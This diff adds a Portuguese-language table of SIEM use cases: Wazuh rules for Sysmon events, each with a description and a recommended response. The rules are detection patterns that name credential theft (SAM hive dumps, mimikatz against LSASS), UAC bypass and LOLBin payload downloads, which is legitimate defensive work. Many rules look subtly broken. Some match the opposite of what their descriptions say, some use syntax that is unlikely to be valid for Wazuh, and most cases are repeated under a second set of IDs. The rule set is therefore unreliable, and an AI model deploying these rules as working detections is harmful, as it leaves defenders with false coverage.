@@ -9979,3 +9979,6077 @@ Detectar esse comportamento é essencial para antecipar ações maliciosas e apl
 | `same_user`    | …e para o mesmo usuário.                                                                    |
 | `level`        | 10 — Alerta de alta criticidade.                                                           |
 | `mitre`        | T1110 — Técnica da matriz MITRE ATT&CK associada à força bruta.                             |
+
+
+## Casos de uso SIEM
+
+| CAMADA | NOME DA REGRA | CATEGORIA DA REGRA | DESCRIÇÃO DA REGRA | REGRA PARA WAZUH | AÇÃO RECOMENDADA |
+| --- | --- | --- | --- | --- | --- |
+| Sysmon | Windows Defender executado de caminho suspeito | Security | Detecta execução do Windows Defender a partir de caminho não padrão, possível carregamento de DLL malicioso. | <rule id="80001" level="10"><field name="data.win.eventdata.Image">*\\Windows Defender\\*</field><description>Windows Defender executado de caminho suspeito.</description></rule> | Investigar execuções fora do caminho padrão; aplicar bloqueios; reforçar monitoramento de execução de antivírus. |
+| Sysmon | Arquivo copiado via pscp.exe | Security | Detecta cópia de arquivos via pscp.exe, com possível exfiltração de dados para sistemas remotos via SSH. | <rule id="80002" level="10"><field name="data.win.eventdata.Image">*\\pscp.exe</field><description>Arquivo copiado via pscp.exe detectado.</description></rule> | Auditar transferências SSH; bloquear ferramentas de transferência não autorizadas; aplicar DLP. |
+| Sysmon | Powershell deletando arquivos | Security | Detecta comandos do Powershell que apagam arquivos ou diretórios, possível ação de limpeza maliciosa. | <rule id="80003" level="12"><field name="data.win.eventdata.CommandLine">*Remove-Item*</field><description>Powershell deletando arquivos detectado.</description></rule> | Revisar políticas de execução de script; alertar sobre exclusões massivas; aplicar restrições de acesso. |
+| Sysmon | Coleta de informações via sessões RDP | Security | Detecta comandos como `query user` usados em sessões RDP para mapear sessões de usuário. | <rule id="80004" level="8"><field name="data.win.eventdata.CommandLine">*query user*</field><description>Coleta de usuário via RDP detectada.</description></rule> | Restringir uso de comandos administrativos; alertar sobre consultas em massa. |
+| Sysmon | Powershell com VSS e hive SAM | Security | Detecta uso do Powershell acessando VSS e arquivos do registro como o hive SAM, possível roubo de credenciais. | <rule id="80005" level="15"><field name="data.win.eventdata.CommandLine">*vssadmin* *sam*</field><description>Atividade suspeita Powershell VSS e hive SAM.</description></rule> | Bloquear scripts que acessam VSS; investigar acessos não autorizados. |
+| Sysmon | Cópia do hive SAM via Powershell | Security | Detecta comando `Copy-Item` utilizado para copiar o hive SAM a partir de VSS, com foco em dumping de credenciais. | <rule id="80006" level="15"><field name="data.win.eventdata.CommandLine">*Copy-Item* *SAM*</field><description>Powershell copiando hive SAM do VSS.</description></rule> | Monitorar cópias de arquivos sensíveis; auditar acesso ao sistema de backup. |
+| Sysmon | Execução do reg.exe | Security | Detecta inicialização do binário reg.exe, usado para manipular o registro do Windows, podendo ser legítimo ou malicioso. | <rule id="80007" level="12"><field name="data.win.eventdata.Image">*\\reg.exe</field><description>Execução do Reg.exe detectada.</description></rule> | Investigar uso fora de horários e perfis esperados; correlacionar com tentativas de dumping. |
+| Sysmon | Reg.exe despejando hive SAM | Security | Detecta reg.exe sendo usado com comandos para salvar o hive SAM localmente. | <rule id="80008" level="15"><field name="data.win.eventdata.CommandLine">*save* *SAM*</field><description>Reg.exe despejando hive SAM.</description></rule> | Bloquear exportação de registros críticos; aplicar regras de controle de acesso. |
+| Sysmon | Powershell iniciou outro powershell | Security | Detecta powershell como pai de outro powershell, padrão comum em scripts encadeados ou ofuscados. | <rule id="80009" level="10"><field name="data.win.eventdata.ParentImage">*\\powershell.exe</field><field name="data.win.eventdata.Image">*\\powershell.exe</field><description>Powershell invocou outra instância de Powershell.</description></rule> | Auditar scripts; restringir encadeamento de shells. |
+| Sysmon | Execução de script Powershell | Security | Detecta execução de arquivos `.ps1` via parâmetro `-File`, indicando scripts automatizados. | <rule id="80010" level="10"><field name="data.win.eventdata.CommandLine">*-File *</field><description>Powershell executou script.</description></rule> | Controlar execução de scripts com GPO; usar whitelist de scripts assinados. |
+| Sysmon | Execução de script em local suspeito | Security | Detecta scripts Powershell em diretórios como `Temp`, comum em malwares fileless. | <rule id="80011" level="12"><field name="data.win.eventdata.CommandLine">*\\temp\\*.ps1</field><description>Script Powershell em local suspeito.</description></rule> | Bloquear execução em diretórios temporários; aplicar política de restrição de caminho. |
+| Sysmon | Coleta de informações via RDP (repetida) | Security | Detecta novamente coleta de informações com comandos administrativos em sessões RDP. | <rule id="80012" level="8"><field name="data.win.eventdata.CommandLine">*query session*</field><description>Coleta de informações de sessão RDP.</description></rule> | Consolidar alertas similares; aplicar supressão se necessário. |
+| Sysmon | Atividade de descoberta executada | Security | Detecta execução de comandos de enumeração de rede, processos, usuários ou domínios. | <rule id="80013" level="10"><field name="data.win.eventdata.CommandLine">*whoami*|*net user*|*tasklist*</field><description>Comando de descoberta executado.</description></rule> | Correlacionar com contexto do host; distinguir administração legítima de atividades suspeitas. |
+| Sysmon | Execução suspeita de shell cmd | Security | Detecta inicialização do `cmd.exe`, especialmente se iniciado de fontes não convencionais. | <rule id="80014" level="10"><field name="data.win.eventdata.Image">*\\cmd.exe</field><description>Execução suspeita de shell cmd.</description></rule> | Bloquear shells não autorizados; auditar execuções por usuários não administrativos. |
+| Sysmon | Descoberta via Powershell | Security | Detecta comandos Powershell com funções de enumeração (`Get-*`), utilizados em reconhecimento. | <rule id="80015" level="10"><field name="data.win.eventdata.CommandLine">*Get-LocalUser*|*Get-AD*</field><description>Descoberta executada via Powershell.</description></rule> | Restringir módulos de AD para scripts; aplicar monitoração detalhada em estações críticas. |
+| Sysmon | Descoberta via cmd.exe | Security | Detecta uso de comandos como `net view`, `ipconfig`, `whoami` por cmd.exe. | <rule id="80016" level="10"><field name="data.win.eventdata.CommandLine">*net view*|*whoami*</field><description>Descoberta executada via cmd.exe.</description></rule> | Correlacionar com contexto de login; identificar padrões repetitivos de enumeração. |
+| Sysmon | Binário iniciado por cmd.exe | Security | Detecta binário qualquer sendo iniciado diretamente pelo cmd.exe, típico em execuções encadeadas ou scripts. | <rule id="80017" level="12"><field name="data.win.eventdata.ParentImage">*\\cmd.exe</field><description>Binário iniciado por shell cmd do Windows.</description></rule> | Investigar cadeia de execução; auditar binários invocados diretamente pelo shell. |
+| Sysmon | CertUtil.exe usado para decodificar arquivo binário. | Security | Detecta o uso do utilitário CertUtil para decodificar arquivos base64, comportamento comum em técnicas de persistência e exfiltração. | <rule id="8001" level="8"><field name="win.eventdata.image">CertUtil.exe</field><field name="win.eventdata.commandLine">*decode*</field><description>CertUtil usado para decodificar arquivos binários.</description></rule> | Investigar se o uso foi administrativo. Aplicar bloqueio de uso indevido via GPO ou AppLocker. |
+| Sysmon | O Windows Defender foi executado de um caminho suspeito, possível carregamento DLL. | Security | Detecta execução do Defender fora do caminho padrão, podendo indicar tentativa de spoofing ou DLL hijacking. | <rule id="8002" level="10"><field name="win.eventdata.image">*\\Windows Defender\\*.exe</field><field name="win.eventdata.originalFileName">MsMpEng.exe</field><description>Windows Defender executado de caminho suspeito.</description></rule> | Verificar hash da execução. Validar assinatura digital. Monitorar persistência. |
+| Sysmon | Um arquivo foi copiado para outro sistema via SSH usando pscp.exe. | Change | Detecta uso do utilitário pscp para cópia remota de arquivos, o que pode indicar exfiltração de dados. | <rule id="8003" level="7"><field name="win.eventdata.image">*\\pscp.exe</field><description>Arquivo copiado via pscp.exe.</description></rule> | Auditar uso da ferramenta. Permitir apenas administradores ou automatizações aprovadas. |
+| Sysmon | Powershell foi usado para deletar arquivos ou diretórios. | Security | Identifica comando de remoção executado via PowerShell, potencial indicador de atividade maliciosa. | <rule id="8004" level="9"><field name="win.eventdata.commandLine">*Remove-Item*</field><description>Powershell usado para deletar arquivos.</description></rule> | Restringir acesso ao PowerShell. Ativar modo restrito e transcrição de logs. |
+| Sysmon | Informações do usuário foram coletadas de sessões do Serviço de Área de Trabalho Remota. | Discovery | Detecta comandos de enumeração de sessão via quser/query user no contexto do RDP. | <rule id="8005" level="8"><field name="win.eventdata.commandLine">*quser*|*query user*</field><description>Coleta de informações de sessões RDP.</description></rule> | Verificar se o usuário é legítimo. Monitorar tentativas correlacionadas com movimentação lateral. |
+| Sysmon | Atividade suspeita de Powershell com VSS e o hive SAM do Windows. | Security | Detecta uso do VSS para copiar o SAM, técnica usada para obter senhas. | <rule id="8006" level="10"><field name="win.eventdata.commandLine">*vssadmin*|*copy*|*SAM*</field><description>Uso de VSS com objetivo de copiar hive SAM.</description></rule> | Restringir uso do vssadmin. Monitorar uso fora de janelas de backup. |
+| Sysmon | Powershell usado para copiar o hive SAM do VSS. | Security | Detecta comando para copiar arquivos críticos como o SAM, LSA ou SYSTEM de snapshots. | <rule id="8007" level="10"><field name="win.eventdata.commandLine">*copy*SAM*|*SYSTEM*</field><description>Cópia do hive SAM do VSS via Powershell.</description></rule> | Ativar proteção de arquivos críticos e revisar acessos administrativos. |
+| Sysmon | Execução do Reg.exe | Change | Monitora execução de utilitário reg.exe, usado para editar o registro do Windows. | <rule id="8008" level="5"><field name="win.eventdata.image">*\\reg.exe</field><description>Execução de reg.exe detectada.</description></rule> | Verificar padrão de uso da ferramenta. Avaliar alteração e origem da execução. |
+| Sysmon | Reg.exe usado para despejar o hive SAM | Security | Detecta uso do reg.exe para exportar dados sensíveis do registro. | <rule id="8009" level="10"><field name="win.eventdata.commandLine">*save*SAM*</field><description>reg.exe usado para despejar hive SAM.</description></rule> | Investigar contexto e origem. Monitorar por exportações similares. |
+| Sysmon | O processo Powershell gerou uma instância do powershell. | Security | Detecta auto-spawn de powershell, que pode indicar execução obfuscada ou de scripts remotos. | <rule id="8010" level="9"><field name="win.eventdata.parentImage">*powershell.exe</field><field name="win.eventdata.image">*powershell.exe</field><description>Powershell invocando nova instância de powershell.</description></rule> | Verificar se há execução de payloads. Analisar argumentos e origem. |
+| Sysmon | Powershell executou um script. | Security | Detecta execução de script via PowerShell, usado em ataques para automatizar ações maliciosas. | <rule id="8011" level="8"><field name="win.eventdata.commandLine">*powershell* -File *</field><description>Powershell executou um script.</description></rule> | Habilitar transcrição de PowerShell e monitorar uso de scripts externos. |
+| Sysmon | Powershell executou script de localização suspeita. | Security | Detecta execução de scripts PowerShell a partir de pastas incomuns (ex: Temp, AppData). | <rule id="8012" level="9"><field name="win.eventdata.commandLine">*AppData*\\*.ps1</field><description>Script PowerShell executado de local suspeito.</description></rule> | Aplicar política de execução restrita. Monitorar acesso a diretórios temporários. |
+| Sysmon | Informações do usuário foram coletadas de sessões do Serviço de Área de Trabalho Remota. | Discovery | Identificação repetida de enumeração de usuários conectados, possivelmente como reconhecimento. | <rule id="8013" level="7"><field name="win.eventdata.commandLine">*qwinsta*|*query user*</field><description>Coleta de sessões remotas RDP.</description></rule> | Correlacionar com logs de autenticação e uso de ferramentas administrativas. |
+| Sysmon | Atividade de descoberta executada. | Discovery | Detecta execução genérica de comandos de enumeração do ambiente, como systeminfo ou net config. | <rule id="8014" level="6"><field name="win.eventdata.commandLine">*systeminfo*|*net config*</field><description>Atividade de descoberta executada.</description></rule> | Monitorar padrão de execução e origem do processo pai. |
+| Sysmon | Execução suspeita de shell cmd do Windows. | Security | Identifica execução de cmd.exe por processo não usual ou com parâmetros suspeitos. | <rule id="8015" level="9"><field name="win.eventdata.image">*\\cmd.exe</field><field name="win.eventdata.parentImage">!C:\\Windows\\System32\\*</field><description>Shell cmd executado de forma suspeita.</description></rule> | Validar processo pai. Bloquear uso via políticas de integridade de código. |
+| Sysmon | Atividade de descoberta gerada via execução de powershell. | Discovery | Detecta comandos de enumeração como Get-NetUser, Get-NetGroup executados via PowerShell. | <rule id="8016" level="8"><field name="win.eventdata.commandLine">*Get-Net*</field><description>Descoberta via PowerShell.</description></rule> | Auditar instalação de frameworks de ofensiva como PowerView. Monitorar lateral movement. |
+| Sysmon | Atividade de descoberta gerada por execução do shell cmd | Discovery | Detecta comandos como net view, net user, ipconfig, via cmd.exe. | <rule id="8017" level="7"><field name="win.eventdata.commandLine">*net view*|*ipconfig*</field><description>Descoberta via cmd.exe.</description></rule> | Relacionar a sessões suspeitas ou fora de horário comercial. |
+| Sysmon | Um comando de descoberta de domínio net.exe foi executado | Discovery | Detecta uso de net.exe com argumentos para enumerar o domínio. | <rule id="8018" level="7"><field name="win.eventdata.commandLine">net* domain*</field><description>Comando net.exe para descoberta de domínio.</description></rule> | Validar se foi administrador. Correlacionar com histórico de execução. |
+| Sysmon | Um binário $(win.eventdata.image) foi iniciado por um shell cmd do Windows | Security | Detecta execução de binários por cmd.exe, indicando possível abuso de terminal. | <rule id="8019" level="9"><field name="win.eventdata.parentImage">*cmd.exe</field><description>Execução de binário via cmd.exe.</description></rule> | Verificar o binário executado e origem da sessão. |
+| Sysmon | Uma conexão net.exe para um recurso remoto foi iniciada por $(win.eventdata.parentImage) | Network | Detecta mapeamento ou uso de compartilhamento remoto com net.exe. | <rule id="8020" level="8"><field name="win.eventdata.commandLine">*net use*</field><description>Conexão remota via net.exe.</description></rule> | Monitorar mapeamento de drives não autorizados. |
+| Sysmon | Uma conexão com recurso em nuvem foi iniciada por $(win.eventdata.parentImage) | Network | Detecta acessos ou montagens de pastas em serviços de nuvem via linha de comando. | <rule id="8021" level="8"><field name="win.eventdata.commandLine">*onedrive*|*dropbox*</field><description>Acesso a recurso em nuvem.</description></rule> | Controlar acesso a serviços de nuvem. Verificar movimentação de arquivos. |
+| Sysmon | Um comando de descoberta de conta net.exe foi iniciado | Discovery | Detecta uso do net.exe para listar usuários ou grupos. | <rule id="8022" level="7"><field name="win.eventdata.commandLine">net user*</field><description>Descoberta de contas com net.exe.</description></rule> | Verificar padrões de auditoria e perfil do usuário. |
+| Sysmon | $(win.eventdata.originalFileName) executou um comando de criação de usuário | Security | Detecta criação de novo usuário via linha de comando, possivelmente persistência. | <rule id="8023" level="10"><field name="win.eventdata.commandLine">net user * /add</field><description>Criação de usuário detectada.</description></rule> | Auditar origem e validar necessidade. Ativar alertas para criação de contas locais. |
+| Sysmon | Valor adicionado à chave do registro tem um padrão semelhante ao Base64 | Security | Detecta adição de valor ao registro com conteúdo semelhante a base64, comum em persistência ou exfiltração. | <rule id="8024" level="8"><field name="win.eventdata.details">*[A-Za-z0-9+/=]{20,}*</field><description>Valor no registro com padrão Base64.</description></rule> | Verificar chave modificada. Identificar se valor representa payload ou configuração persistente. |
+| Sysmon | Comando Netsh invocado | Change | Detecta uso da ferramenta netsh, usada para manipular configurações de rede e firewall. | <rule id="8025" level="6"><field name="win.eventdata.commandLine">*netsh*</field><description>Netsh invocado.</description></rule> | Auditar uso administrativo. Monitorar por alterações suspeitas em firewall ou proxy. |
+| Sysmon | Netsh usado para adicionar regra de firewall | Security | Detecta comando netsh com argumentos que indicam adição de regras no firewall. | <rule id="8026" level="9"><field name="win.eventdata.commandLine">*netsh*firewall*add*</field><description>Netsh adicionando regra de firewall.</description></rule> | Verificar origem e justificativa da alteração. Validar integridade da regra criada. |
+| Sysmon | Netsh usado para adicionar regra de firewall referenciando a porta 5900, geralmente usada para VNC | Security | Detecta criação de regra de firewall para porta 5900, possível túnel VNC malicioso. | <rule id="8027" level="10"><field name="win.eventdata.commandLine">*netsh*add*5900*</field><description>Firewall liberando porta 5900 (VNC).</description></rule> | Bloquear uso de VNC não autorizado. Verificar persistência via serviço. |
+| Sysmon | Reg.exe modificou o registro usando arquivo .reg em localização suspeita | Security | Detecta execução de reg.exe com argumento para importar chave de local não usual. | <rule id="8028" level="9"><field name="win.eventdata.commandLine">*reg import*AppData*</field><description>reg.exe importando .reg de local suspeito.</description></rule> | Monitorar arquivos .reg em locais não padrões. Bloquear execução via GPO. |
+| Sysmon | Possível uso de fodhelper.exe para contornar o UAC e executar software malicioso | Security | Detecta execução do fodhelper.exe com possível uso para bypass de UAC. | <rule id="8029" level="10"><field name="win.eventdata.image">*\\fodhelper.exe</field><description>Possível bypass UAC via fodhelper.</description></rule> | Auditar alterações no registro relacionadas ao fodhelper. Bloquear via AppLocker. |
+| Sysmon | Aplicação do Office iniciou mshta.exe | Security | Detecta spawn de mshta.exe a partir de processos do Office, padrão de ataque via macro. | <rule id="8030" level="10"><field name="win.eventdata.parentImage">*\\winword.exe|excel.exe*</field><field name="win.eventdata.image">*\\mshta.exe</field><description>Office invocou mshta.exe.</description></rule> | Bloquear mshta.exe via política. Restringir macros e add-ins desconhecidos. |
+| Sysmon | Aplicação do Office iniciou mshta.exe e executou comando de script | Security | Detecta mshta.exe executando comandos, possivelmente via HTA malicioso. | <rule id="8031" level="10"><field name="win.eventdata.commandLine">*mshta*javascript*</field><description>Mshta executando script.</description></rule> | Bloquear mshta. Verificar arquivos temporários HTA. Isolar máquina para análise. |
+| Sysmon | Verclsid.exe pode ter sido usado para executar carga útil COM | Security | Detecta execução do verclsid.exe fora de contexto, possível execução de payload COM. | <rule id="8032" level="9"><field name="win.eventdata.image">*verclsid.exe</field><description>Uso suspeito de verclsid.exe.</description></rule> | Correlacionar com processo pai. Verificar comportamento anômalo ou persistência. |
+| Sysmon | Aplicação do Office invocou Verclsid.exe, possível execução de carga útil COM | Security | Detecta verclsid.exe iniciado pelo Office, técnica conhecida de execução indireta. | <rule id="8033" level="10"><field name="win.eventdata.parentImage">*winword.exe|excel.exe*</field><field name="win.eventdata.image">*verclsid.exe</field><description>Office iniciou Verclsid.exe.</description></rule> | Rever documentos manipulados. Executar análise estática de arquivos recebidos. |
+| Sysmon | Executou uma cópia renomeada do wscript.exe | Security | Detecta execução de wscript.exe com nome alterado, comum em evasão. | <rule id="8034" level="10"><field name="win.eventdata.originalFileName">wscript.exe</field><field name="win.eventdata.image">!*\\wscript.exe</field><description>Wscript renomeado detectado.</description></rule> | Bloquear execução de cópias renomeadas. Monitorar assinatura e hash do binário. |
+| Sysmon | Execução de script via wscript em local incomum | Security | Detecta execução de scripts .vbs por wscript.exe em diretórios suspeitos. | <rule id="8035" level="9"><field name="win.eventdata.commandLine">*wscript*AppData*</field><description>Script VBS executado em local suspeito.</description></rule> | Restringir acesso a execução de scripts. Validar conteúdo do VBS. |
+| Sysmon | Uso do rundll32 para executar DLL suspeita | Security | Detecta execução de DLL por rundll32 fora do caminho padrão. | <rule id="8036" level="9"><field name="win.eventdata.commandLine">*rundll32.exe*AppData*</field><description>DLL suspeita via rundll32.</description></rule> | Investigar argumentos da DLL. Bloquear locais não confiáveis na política. |
+| Sysmon | Rundll32 executando javascript via comsvcs.dll | Security | Detecta técnica de execução de JavaScript via rundll32 e COM. | <rule id="8037" level="10"><field name="win.eventdata.commandLine">*rundll32.exe*comsvcs.dll*</field><description>Execução de JS via comsvcs.dll.</description></rule> | Bloquear comportamento via AppLocker. Correlacionar com download prévio. |
+| Sysmon | Execução do script encoded com PowerShell -EncodedCommand | Security | Detecta execução de comandos obfuscados base64 com PowerShell. | <rule id="8038" level="10"><field name="win.eventdata.commandLine">*EncodedCommand*</field><description>PowerShell com comando codificado.</description></rule> | Aplicar logging com desofuscação. Bloquear uso do parâmetro. |
+| Sysmon | Uso de PowerShell com Bypass, Hidden ou WindowStyle | Security | Detecta parâmetros que escondem a execução e tentam burlar políticas. | <rule id="8039" level="10"><field name="win.eventdata.commandLine">*bypass*|*hidden*|*WindowStyle*</field><description>PowerShell com parâmetros de evasão.</description></rule> | Revisar contexto. Ativar logs completos e bloquear execuções automatizadas. |
+| Sysmon | Uso de bitsadmin para baixar arquivo | Security | Detecta uso do bitsadmin, ferramenta de transferência usada para download de payloads. | <rule id="8040" level="9"><field name="win.eventdata.image">*bitsadmin.exe</field><description>Bitsadmin executando download.</description></rule> | Bloquear ferramenta. Monitorar conexões de saída anômalas. |
+| Sysmon | Uso do certreq.exe fora de contexto administrativo | Security | Detecta certreq executando solicitação de certificado, potencial persistência. | <rule id="8041" level="8"><field name="win.eventdata.image">*certreq.exe</field><description>Solicitação de certificado fora de contexto.</description></rule> | Verificar presença de certificados anômalos. Auditoria de Autoridade Certificadora local. |
+| Sysmon | Uso do msiexec para execução de payload | Security | Detecta execução de binários maliciosos via msiexec (ex: via URL). | <rule id="8042" level="9"><field name="win.eventdata.commandLine">*msiexec*http*</field><description>Execução via msiexec com URL.</description></rule> | Bloquear instalação remota via política. Monitorar via proxy. |
+| Sysmon | Executável foi iniciado com nome similar ao do sistema (ex: svch0st.exe) | Security | Detecta tentativa de camuflagem usando nomes similares aos processos legítimos. | <rule id="8043" level="10"><field name="win.eventdata.image">*svch0st.exe|lsasss.exe*</field><description>Nome de processo similar ao sistema.</description></rule> | Analisar nome, hash e local do binário. Reforçar alertas por typo-squatting. |
+| Sysmon | Processo iniciou com nome legítimo, mas sem assinatura digital | Security | Detecta processos com nomes do sistema, mas sem assinatura válida. | <rule id="8044" level="9"><field name="win.eventdata.originalFileName">*svchost.exe*</field><field name="win.eventdata.signatureStatus">Unsigned</field><description>Nome legítimo, mas sem assinatura digital.</description></rule> | Validar assinatura digital em todos os binários críticos. Ativar AppLocker. |
+| Sysmon | Serviço foi criado ou modificado fora do contexto administrativo | Security | Detecta criação de novo serviço sem autorização esperada. | <rule id="8045" level="9"><field name="win.eventdata.eventID">7045</field><description>Criação de serviço anômala.</description></rule> | Auditar contas com permissão de criação de serviço. Verificar persistência. |
+| Sysmon | Processo tentou injetar código em outro processo (EventID 10) | Security | Detecta tentativa de injeção de código, comum em RATs. | <rule id="8046" level="10"><field name="win.eventdata.eventID">10</field><description>Injeção de código detectada.</description></rule> | Investigar processo origem e destino. Correlacionar com anomalias comportamentais. |
+| Sysmon | Imagem de processo foi modificada após execução | Security | Detecta técnica de process hollowing. | <rule id="8047" level="10"><field name="win.eventdata.eventID">1</field><field name="win.eventdata.imageLoaded">!matchOriginal*</field><description>Processo alterado após carregamento.</description></rule> | Monitorar integridade de processos. Reforçar endpoint protection. |
+| Sysmon | Conexão de processo com IP externo anômalo | Network | Detecta comunicação com endereço IP fora do escopo corporativo. | <rule id="8048" level="8"><field name="win.eventdata.destinationIp">!192.168.*|10.*|172.16.*</field><description>Conexão externa anômala.</description></rule> | Verificar reputação do IP. Correlacionar com horário de execução. |
+| Sysmon | Processo filho iniciado por navegador (ex: Chrome → PowerShell) | Security | Detecta spawn de processos perigosos a partir do navegador. | <rule id="8049" level="9"><field name="win.eventdata.parentImage">*chrome.exe*</field><field name="win.eventdata.image">*powershell.exe*</field><description>Navegador iniciou PowerShell.</description></rule> | Isolar endpoint. Verificar histórico de navegação e arquivos baixados. |
+| Sysmon | Uso de ferramenta de rede não autorizada (ex: nmap) | Security | Detecta execução de binários de varredura localmente. | <rule id="8050" level="9"><field name="win.eventdata.image">*nmap.exe*</field><description>Execução de ferramenta de varredura.</description></rule> | Remover binários suspeitos. Auditar instalação e justificar presença. |
+| Sysmon | Processo tentou acessar credenciais armazenadas (ex: LSASS) | Security | Detecta tentativa de acesso ao processo lsass.exe. | <rule id="8051" level="10"><field name="win.eventdata.image">*mimikatz.exe*</field><description>Acesso a LSASS por ferramenta suspeita.</description></rule> | Isolar host. Reforçar Proteção de Credenciais via Credential Guard. |
+| Sysmon | Script HTA foi executado via mshta.exe | Security | Detecta execução de payload HTA com mshta.exe. | <rule id="8052" level="10"><field name="win.eventdata.image">*mshta.exe</field><description>Execução de HTA via mshta.</description></rule> | Bloquear mshta.exe. Verificar conteúdo de scripts HTA. |
+| Sysmon | Uso de processo LOLBin para evasão (ex: regsvr32 com URL) | Security | Detecta uso de living-off-the-land binaries com argumentos maliciosos. | <rule id="8053" level="10"><field name="win.eventdata.commandLine">*regsvr32*http*</field><description>LOLBin usado para evasão.</description></rule> | Aplicar bloqueio via AppLocker. Monitorar uso não interativo de binários do sistema. |
+| Sysmon | Prompt de comando do Windows iniciado por um processo anômalo | Security | Detecta o cmd.exe sendo iniciado por um processo não usual, indicando possível execução maliciosa via dropper. | <rule id="8054" level="9"><field name="win.eventdata.image">*\\cmd.exe</field><field name="win.eventdata.parentImage">!*\\Windows\\*</field><description>Cmd.exe iniciado por processo anômalo.</description></rule> | Verificar processo pai. Auditar execução com cmd via políticas de integridade. |
+| Sysmon | Processo suspeito lançado com assinatura de mecanismo jscript | Security | Detecta processos que possuem assinatura indicando JScript como mecanismo, comumente usado para execução de payloads. | <rule id="8055" level="10"><field name="win.eventdata.originalFileName">jscript.dll</field><description>Processo com assinatura jscript.dll.</description></rule> | Investigar origem do script. Bloquear execução de scripts não assinados. |
+| Sysmon | Execução suspeita de arquivo .js por $(win.eventdata.image) | Security | Detecta execução de scripts .js via mecanismos como wscript ou mshta. | <rule id="8056" level="9"><field name="win.eventdata.commandLine">*.js*</field><description>Execução suspeita de arquivo .js.</description></rule> | Restringir execução de .js. Monitorar processos relacionados como wscript e cscript. |
+| Sysmon | Utilitário conhecido auto-elevado $(win.eventdata.originalFileName) pode ter sido usado para contornar o UAC | Security | Detecta execução de binário com capacidade de autoelevação (ex: eventvwr.exe, fodhelper.exe). | <rule id="8057" level="10"><field name="win.eventdata.originalFileName">*eventvwr.exe|fodhelper.exe*</field><description>Possível bypass de UAC via autoelevado.</description></rule> | Auditar uso desses binários. Remover permissões desnecessárias. |
+| Sysmon | Processo Powershell invocou utilitário auto-elevado $(win.eventdata.originalFileName), pode ter sido usado para contornar o UAC | Security | Detecta PowerShell lançando binários conhecidos por contornar UAC. | <rule id="8058" level="10"><field name="win.eventdata.parentImage">*powershell.exe*</field><field name="win.eventdata.originalFileName">fodhelper.exe|eventvwr.exe</field><description>Bypass UAC via PowerShell e autoelevado.</description></rule> | Aplicar AppLocker. Correlacionar com execução anterior. |
+| Sysmon | Powershell.exe gerou um processo Powershell que executou um comando codificado em base64 | Security | Detecta execução de comandos codificados via PowerShell spawnando outra instância. | <rule id="8059" level="10"><field name="win.eventdata.parentImage">*powershell.exe*</field><field name="win.eventdata.commandLine">*EncodedCommand*</field><description>Powershell com comando codificado base64.</description></rule> | Ativar desofuscação de logs. Limitar execução em cascata. |
+| Sysmon | Banco de Dados de Compatibilidade de Aplicativos lançado | Change | Detecta execução de sdbinst.exe, usado para instalar shims de compatibilidade. | <rule id="8060" level="7"><field name="win.eventdata.image">*sdbinst.exe*</field><description>Lançamento de banco de dados de compatibilidade.</description></rule> | Verificar se há instalação de shim malicioso. Monitorar persistência. |
+| Sysmon | Possível Shimming. Banco de Dados de Compatibilidade de Aplicativos lançado de um comando powershell codificado | Security | Detecta instalação de shim via PowerShell com comando codificado. | <rule id="8061" level="10"><field name="win.eventdata.image">*sdbinst.exe*</field><field name="win.eventdata.parentImage">*powershell.exe*</field><field name="win.eventdata.commandLine">*EncodedCommand*</field><description>Shim instalado via PowerShell codificado.</description></rule> | Bloquear sdbinst para usuários padrão. Monitorar shims aplicados. |
+| Sysmon | Processo suspeito (caractere de substituição de direita para esquerda) gerou um subprocesso | Security | Detecta mascaramento de arquivos com uso de caracteres especiais unicode. | <rule id="8062" level="10"><field name="win.eventdata.image">*\\*.exe*</field><field name="win.eventdata.originalFileName">*&#x202E;*</field><description>Processo com RTL override gerando subprocesso.</description></rule> | Inspecionar nome real do executável. Bloquear nomes com caracteres unicode perigosos. |
+| Sysmon | Ferramenta de backup e restauração do Windows $(win.eventdata.originalFileName) lançada por $(win.eventdata.parentImage) com nível de integridade $(win.eventdata.integrityLevel) | Security | Detecta execução de ferramentas sensíveis com nível de integridade elevado. | <rule id="8063" level="9"><field name="win.eventdata.originalFileName">sdclt.exe|wbadmin.exe</field><description>Ferramenta de backup executada com integridade elevada.</description></rule> | Restringir execução a administradores. Verificar contexto de uso. |
+| Sysmon | Powershell iniciado com nível de integridade $(win.eventdata.integrityLevel) por $(win.eventdata.parentImage) | Security | Detecta PowerShell executado com alta integridade por processos inusuais. | <rule id="8064" level="9"><field name="win.eventdata.image">*powershell.exe*</field><field name="win.eventdata.integrityLevel">High</field><description>PowerShell iniciado com alta integridade.</description></rule> | Bloquear PowerShell em alta integridade fora de sessões administrativas. |
+| Sysmon | Exclusão de arquivo por $(win.eventdata.originalFileName). Comando: $(win.eventdata.commandLine) | Change | Detecta uso de comandos de exclusão, indicando limpeza de rastros. | <rule id="8065" level="8"><field name="win.eventdata.commandLine">*del*|*Remove-Item*</field><description>Exclusão de arquivos detectada.</description></rule> | Correlacionar com ações anteriores. Verificar se houve exfiltração antes. |
+| Sysmon | Processo suspeito executado com caractere de substituição de direita para esquerda no arquivo binário, possível mascaramento de arquivo malicioso | Security | Detecta binário com nome mascarado via técnica de RTL override. | <rule id="8066" level="10"><field name="win.eventdata.image">*&#x202E;*</field><description>Mascaramento de nome de arquivo com RTL override.</description></rule> | Bloquear caracteres especiais em nomes de arquivos executáveis. |
+| Sysmon | Powershell.exe iniciado por binário $(win.eventdata.parentImage) em localização suspeita | Security | Detecta spawn de PowerShell por processo não confiável em local anômalo. | <rule id="8067" level="9"><field name="win.eventdata.image">*powershell.exe*</field><field name="win.eventdata.parentImage">*AppData*|*Temp*</field><description>PowerShell iniciado por binário em local suspeito.</description></rule> | Reforçar proteção em AppData. Isolar binário pai para análise. |
+| Sysmon | Binário $(win.eventdata.image) em localização suspeita iniciado por $(win.eventdata.parentImage) | Security | Detecta execução de binários em diretórios não convencionais. | <rule id="8068" level="9"><field name="win.eventdata.image">*AppData*|*Temp*</field><description>Binário em localização suspeita executado.</description></rule> | Auditar processos. Bloquear execução em diretórios temporários. |
+| Sysmon | $(win.eventdata.image) iniciado por $(win.eventdata.parentImage) executou um comando de criação de arquivo comprimido | Security | Detecta uso de ferramentas como makecab, compact, compress-archive via spawn indireto. | <rule id="8069" level="8"><field name="win.eventdata.commandLine">*makecab*|*Compress-Archive*</field><description>Criação de arquivo comprimido detectada.</description></rule> | Auditar conteúdo do arquivo gerado. Verificar possíveis exfiltrações. |
